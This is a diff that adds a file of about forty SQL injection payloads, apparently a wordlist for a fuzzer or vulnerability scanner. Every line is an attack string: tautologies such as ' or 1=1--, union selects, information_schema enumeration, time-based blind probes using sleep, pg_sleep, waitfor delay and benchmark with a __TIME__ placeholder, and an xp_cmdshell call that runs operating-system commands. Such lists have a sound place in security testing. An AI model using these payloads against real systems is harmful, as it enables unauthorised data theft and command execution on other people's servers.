@@ -1,0 +1,40 @@
+) or pg_sleep(__TIME__)--
+ union select
+ or sleep(__TIME__)#
+ select * from information_schema.tables--
+a' or 1=1--
+a' or 'a' = 'a
+declare @s varchar(22) select @s =
+ or 2 between 1 and 3
+ or a=a--
+ or '1'='1
+|
+ or sleep(__TIME__)='
+ or 1 --'
+or 0=0 #"
+having
+a'
+" or isNULL(1/0) /*
+declare @s varchar (8000) select @s = 0x73656c ...
+â or 1=1 --
+char%4039%41%2b%40SELECT
+order by
+bfilename
+ having 1=1--
+) or benchmark(10000000,MD5(1))#
+ or username like char(37);
+;waitfor delay '0:0:__TIME__'--
+" or 1=1--
+x' AND userid IS NULL; --
+*/*
+ or 'text' > 't'
+ (select top 1
+ or benchmark(10000000,MD5(1))#
+");waitfor delay '0:0:__TIME__'--
+a' or 3=3--
+ -- &password=
+ group by userid having 1=1--
+ or ''='
+; exec master..xp_cmdshell
+%20or%20x=x
+select
